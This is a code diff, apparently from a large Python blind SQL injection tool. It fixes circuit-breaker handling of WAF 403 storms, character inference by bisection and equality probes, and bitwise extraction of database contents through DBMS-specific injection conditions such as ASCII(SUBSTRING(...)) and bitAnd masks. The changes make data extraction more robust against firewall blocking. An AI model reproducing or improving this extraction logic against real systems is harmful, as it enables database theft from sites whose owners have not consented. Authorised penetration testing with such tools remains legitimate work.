@@ -32526,6 +32526,22 @@ class GlobalRequestGate:
                     self._delay = min(self._max_delay, self._delay * 2 + 0.5)
                     self._paused_until = time.monotonic() + 10 + random.uniform(0, 5)
                     print(f"[!] [Gate] Repeated 403s  delay {old_delay:.1f}→{self._delay:.1f}s, pausing 10s", flush=True)
+                # BUG-CB-403-NO-BREAKER FIX: The 403 branch incremented _consecutive_fail
+                # but never checked the CB threshold, so a WAF storm returning 403 for every
+                # probe could accumulate hundreds of failures without opening the circuit breaker.
+                # Only the generic `elif error:` branch had the CB-open check.  Fix: apply the
+                # same threshold check here so 403 storms also trigger the circuit breaker.
+                _cb_threshold_403 = 10
+                if self._consecutive_fail >= _cb_threshold_403 and not self._circuit_open:
+                    self._circuit_open = True
+                    self._circuit_open_since = time.monotonic()
+                    self._circuit_trip_count += 1
+                    self._consecutive_fail = _cb_threshold_403
+                    _extra = max(0, (self._circuit_trip_count - 1) // 2) * 60
+                    _pause = min(300, 60 + _extra + random.uniform(0, 15))
+                    self._paused_until = time.monotonic() + _pause
+                    print(f"[!] [Gate]  CIRCUIT BREAKER OPEN  {self._consecutive_fail} consecutive errors  "
+                          f"halting ALL requests for {_pause:.0f}s", flush=True)
 
             elif error:
                 self._consecutive_ok = 0
@@ -32602,7 +32618,11 @@ class GlobalRequestGate:
                               f"(confidence: {confidence:.0%})", flush=True)
                 
                 self._consecutive_ok += 1
-                self._consecutive_fail = max(0, self._consecutive_fail - 1)
+                # BUG-CB-SUCCESS-NODECREMENT FIX: Decrementing by 1 per success means a WAF
+                # storm that built the counter to 200+ takes 200 clean requests to drain,
+                # keeping the circuit on the edge of re-opening indefinitely.  Reset to 0
+                # on any genuine success so the gate recovers cleanly.
+                self._consecutive_fail = 0
                 self._rpm_429_boost = max(0, self._rpm_429_boost - 1)  # Decay 429 boost on success
                 
                 if self._circuit_open:
@@ -32674,6 +32694,11 @@ class AdaptiveRateController:
         if self._circuit_open:
             # Still open after wait — reset counter so probe failures don't accumulate.
             self._consecutive_fail = 10
+            # BUG-CB-ARC-FALLTHROUGH FIX: Previously execution fell through to
+            # self._semaphore.acquire() even when _circuit_open was still True after
+            # the 60-second wait, allowing a request through a supposedly closed circuit.
+            # Raise to abort this request; the caller's exception handler will skip it.
+            raise RuntimeError("AdaptiveRateController: circuit still open after wait — request aborted")
         await self._semaphore.acquire()
         # Honor pause (backoff after throttle/ban)
         now = time.monotonic()
@@ -63712,22 +63737,26 @@ class Scanner:
                                 "blocking confirmed for equality probes; aborting scan.",
                                 p, _val, _complement_val)
                             return None
-                        # RC8-EXT FIX (CRITICAL): When complement probe returns None AND
-                        # _fe_seen_false is empty (no WAF-safe False baseline established
-                        # yet), we cannot distinguish a genuine True match from WAF-uniform
-                        # blocking where ordinal 0 is also ambiguous.  Returning chr(_val)
-                        # here produces 'a' for every position when WAF blocks all equality
-                        # probes uniformly (complement=0 \u2192 None, no known-safe values yet).
-                        # Fix: defer to the ambiguous list and continue scanning.  If _val
-                        # truly is the correct character, all remaining candidates will return
-                        # False (confirming _val as the sole ambiguous = real match), and the
-                        # single-ambiguous resolution path returns it correctly.  If WAF is
-                        # uniform, multiple candidates end up ambiguous and the scanner aborts.
-                        if _comp_r is None and not _fe_seen_false:
+                        # RC8-EXT FIX (CRITICAL): When complement probe returns None,
+                        # we cannot distinguish a genuine True match from WAF-uniform blocking
+                        # regardless of _fe_seen_false state.
+                        #
+                        # Old behaviour: when _fe_seen_false was non-empty the None-complement
+                        # branch was skipped, falling through to `return chr(_val)` \u2014 accepting
+                        # the candidate with zero complement confirmation.  This produced runs
+                        # of 'a' and 'b' (first chars in the frequency-ordered scan list) for
+                        # every noisy position, because both have near-threshold timing and
+                        # their complement probes time out to None under load.
+                        #
+                        # Fix: defer to the ambiguous list whenever _comp_r is None, regardless
+                        # of _fe_seen_false.  The single-ambiguous resolution path at the end
+                        # of the scan returns the character when it is the only ambiguous value
+                        # (all others returned False).  Multiple ambiguous values \u2192 abort.
+                        if _comp_r is None:
                             LOG.debug(
                                 "[Inference] pos=%d equality: match val=%d but complement "
-                                "(val=%d, no WAF-safe baseline) returned None \u2014 "
-                                "deferring to ambiguous list (cannot confirm vs. WAF-uniform).",
+                                "(val=%d) returned None \u2014 deferring to ambiguous list "
+                                "(cannot confirm without complement=False).",
                                 p, _val, _complement_val)
                             _fe_ambiguous.append(_val)
                             continue
@@ -64611,10 +64640,15 @@ class Scanner:
                         # MySQL) producing supplementary-plane garbage (U+10XXXX). This happens when
                         # WAF blocks ALL comparison-operator SQL for this specific query/param
                         # combination (returns 403/True signal uniformly). Detect it early:
-                        # after 6+ consecutive True results with lo already past ASCII/Latin range
-                        # (>10000), abort to equality fallback which uses only the = operator
+                        # after 3+ consecutive True results with lo already past printable ASCII
+                        # (>200), abort to equality fallback which uses only the = operator
                         # (WAFs are much less likely to block equality probes uniformly).
-                        if _bisect_consec_true >= 6 and lo > 10000:
+                        # BUG-BISECT-ABORT-THRESHOLD FIX: was >=6 and >10000, allowing lo to
+                        # climb deep into supplementary Unicode planes before aborting.  With
+                        # >=3 and >200 the abort fires before lo leaves the Latin-1 range,
+                        # cutting wasted probes from ~6 to 3 and handing off to the WAF-safe
+                        # equality fallback much earlier.
+                        if _bisect_consec_true >= 3 and lo > 200:
                             LOG.warning(
                                 "[Inference] %s[%d] bisection WAF-uniform suspected: lo=%d after "
                                 "%d consecutive True results — comparison oracle blocked, "
@@ -168361,6 +168395,12 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
     ascii_tmpl = _ascii_fns.get(dbms, "ASCII(SUBSTRING(({q}),{p},1))")
     len_tmpl = _len_fns.get(dbms, "LENGTH(({q}))")
 
+    # BUG-NOVEL-INVERSION-SANITY FIX: Pre-save the raw oracle BEFORE any inversion wrapper
+    # may be applied below.  The selective-mask sanity checks (RC5-FIX) must use this raw
+    # reference so that WAF-blocked probes (True in raw oracle) are not silently inverted
+    # to False, which would defeat those checks and allow garbage extraction to proceed.
+    _raw_eval_fn_for_mask_sanity = eval_fn
+
     # Get length via bitwise (8 bits  up to 255)
     length = 0
     for bit in range(7, -1, -1):
@@ -168469,6 +168509,14 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
                             "and retrying extraction with corrected oracle",
                             label)
                 _orig_eval_fn = eval_fn
+                # BUG-NOVEL-INVERSION-SANITY FIX: Save a reference to the raw (pre-inversion)
+                # oracle here.  The selective-mask sanity checks (RC5-FIX, lines below) MUST
+                # use the raw oracle to detect WAF blocking of &mask=mask patterns.  When the
+                # inverted wrapper is applied first, WAF-blocked probes that return True (raw)
+                # are flipped to False, bypassing the abort checks and allowing garbage
+                # extraction to continue.  The raw oracle is used only for the sanity checks;
+                # all actual char extraction uses the inverted (corrected) eval_fn.
+                _raw_eval_fn_for_mask_sanity = _orig_eval_fn
                 async def _inverted_eval_fn(cond, _fn=_orig_eval_fn):
                     _r = await _fn(cond)
                     if _r is None:
@@ -168601,6 +168649,10 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
     # True  → WAF selectively blocks hex-8 mask patterns → abort.
     # None  → ambiguous (WAF challenge body), treat as blocked → abort.
     # False → selective-mask blocking not present → extraction safe.
+    #
+    # BUG-NOVEL-INVERSION-SANITY FIX: Use _raw_eval_fn_for_mask_sanity (the oracle
+    # BEFORE any polarity-inversion wrapper) for this check.  With the inverted wrapper,
+    # a WAF-blocked probe (True in raw oracle) becomes False, silently bypassing the abort.
     try:
         _sel_mask_fn = ascii_tmpl.format(q=query, p=1)
         if dbms == "Oracle":
@@ -168611,7 +168663,7 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
             _sel_mask_cond = f"bitAnd({_sel_mask_fn},8)=1"
         else:
             _sel_mask_cond = f"{_sel_mask_fn}&8=1"
-        _sel_mask_r = await eval_fn(_sel_mask_cond)
+        _sel_mask_r = await _raw_eval_fn_for_mask_sanity(_sel_mask_cond)
         if _sel_mask_r is True:
             LOG.warning(
                 "[Novel] %s: selective-mask sanity FAILED (char &8=1 → True). "
@@ -168629,8 +168681,12 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
                 "garbled extraction.", label)
             return ""
     except Exception as _sel_mask_exc:
-        LOG.debug("[Novel] %s: selective-mask sanity error (non-fatal): %s",
-                  label, _sel_mask_exc)
+        # BUG-NOVEL-SANITY-EXCEPT FIX: Previously exceptions were swallowed (non-fatal),
+        # allowing extraction to proceed with an unvalidated oracle.  Any exception here
+        # means the sanity probe could not complete — treat as unsafe and abort.
+        LOG.warning("[Novel] %s: selective-mask sanity probe raised exception — aborting: %s",
+                    label, _sel_mask_exc)
+        return ""
     await asyncio.sleep(delay * 0.3)
 
     # RC5-FIX-EXT: Complementary sanity check for WAF blocking &mask=mask (the exact
@@ -168655,7 +168711,11 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
             _mem_cond = "bitAnd(0,8)=8"
         else:
             _mem_cond = "0&8=8"
-        _mem_r = await eval_fn(_mem_cond)
+        # BUG-NOVEL-INVERSION-SANITY FIX: Use raw oracle (pre-inversion) for this check.
+        # With the inverted wrapper applied, a WAF-blocked probe returning True (raw) is
+        # flipped to False, which does not trigger the `if _mem_r is True: return ""`
+        # guard, defeating the check and allowing garbled extraction to continue.
+        _mem_r = await _raw_eval_fn_for_mask_sanity(_mem_cond)
         if _mem_r is True:
             LOG.warning(
                 "[Novel] %s: mask=value sanity FAILED (constant 0&8=8 → True). "
@@ -168674,8 +168734,12 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
                 "aborting to prevent garbled extraction.", label)
             return ""
     except Exception as _mem_exc:
-        LOG.debug("[Novel] %s: mask=value sanity error (non-fatal): %s",
-                  label, _mem_exc)
+        # BUG-NOVEL-SANITY-EXCEPT FIX: Previously exceptions were swallowed (non-fatal).
+        # An exception during the mask=value sanity probe means we cannot verify oracle
+        # safety — abort to prevent garbled extraction.
+        LOG.warning("[Novel] %s: mask=value sanity probe raised exception — aborting: %s",
+                    label, _mem_exc)
+        return ""
     await asyncio.sleep(delay * 0.3)
 
     # Extract chars
